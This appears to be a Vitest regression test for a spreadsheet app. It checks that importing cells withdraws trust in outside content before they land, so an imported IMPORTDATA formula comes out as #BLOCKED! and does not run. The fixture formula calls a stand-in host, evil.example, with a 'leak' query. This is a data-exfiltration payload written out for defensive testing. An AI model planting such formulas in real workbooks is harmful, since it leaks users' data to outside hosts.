// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { Doc } from '../src/lib/doc.js';
import { openImportPlacementDialog } from '../src/ui/importdialog.js';
import { closeAllModals } from '../src/ui/modal.js';
import { memoryStorage } from './helpers/memory-storage.js';

vi.mock('../src/ui/toast.js', () => ({ toast: vi.fn() }));

// Placing an imported file's cells announces the change before the document was told to distrust
// outside content, so a listener reading a placed IMPORTDATA cell on that announcement ran it with
// the trust the document had. Trust is withdrawn before the first cell lands now, and given back
// untouched when nothing could be placed.
let doc;
beforeEach(() => {
  Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true }));
  document.body.innerHTML = '<div id="app"></div>';
});
afterEach(() => { closeAllModals(); doc?.destroy(); doc = null; vi.clearAllTimers(); vi.useRealTimers(); vi.unstubAllGlobals(); document.body.replaceChildren(); });

const FORMULA = 'IMPORTDATA("https://evil.example/?d=leak")';
function setUp() {
  doc = new Doc({ name: 'Mine' });
  const { wb } = doc;
  const id = wb.activeSheetId;
  wb.setInput(id, 0, 0, 'Existing');
  const calls = [];
  wb.setAsyncProvider('IMPORTDATA', async (text) => { calls.push(text); return [['fetched']]; });
  const other = new Workbook();
  other.setInput(other.activeSheetId, 0, 0, `=${FORMULA}`);
  // A listener that reads the placed cell the moment it lands, as the status bar reads the selection.
  const seen = [];
  wb.addEventListener('change', () => { if (wb.getCell(id, 2, 0)?.f) seen.push(wb.getValue(id, 2, 0)); });
  const ctx = { wb, doc, sheetId: () => id, active: () => ({ r: 2, c: 0 }), grid: { focus() {} } };
  return { wb, id, other, calls, seen, ctx };
}
function submit(ctx, other, mode) {
  const modal = openImportPlacementDialog(ctx, other, 'theirs.xlsx');
  modal.panel.querySelector(`input[value="${mode}"]`).click();
  modal.panel.querySelector('form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  return modal;
}

it('withdraws trust before the imported cells land, so whoever reads them as they do sees #BLOCKED!', async () => {
  const { wb, id, other, calls, seen, ctx } = setUp();
  expect(wb.externalAllowed).toBe(true);
  submit(ctx, other, 'cell');
  expect(wb.getCell(id, 2, 0).f).toBe(FORMULA);
  expect(seen.length).toBeGreaterThan(0);
  for (const value of seen) expect(value).toEqual({ error: '#BLOCKED!' });
  expect(wb.externalAllowed).toBe(false);
  await vi.advanceTimersByTimeAsync(50);
  expect(calls).toEqual([]);
  expect(wb.getValue(id, 2, 0)).toEqual({ error: '#BLOCKED!' });
});

it('leaves trust as it was when nothing could be placed', () => {
  const { wb, id, other, ctx } = setUp();
  wb.setSheetProtected(id, true);
  wb.clearHistory();
  wb.markClean();
  const modal = submit(ctx, other, 'cell');
  expect(modal.panel.querySelector('[role="alert"]').hidden).toBe(false);
  expect(wb.getCell(id, 2, 0)).toBeFalsy();
  expect(wb.externalAllowed).toBe(true);
  expect(wb.dirty).toBe(false);
  expect(wb.canUndo()).toBe(false);
});
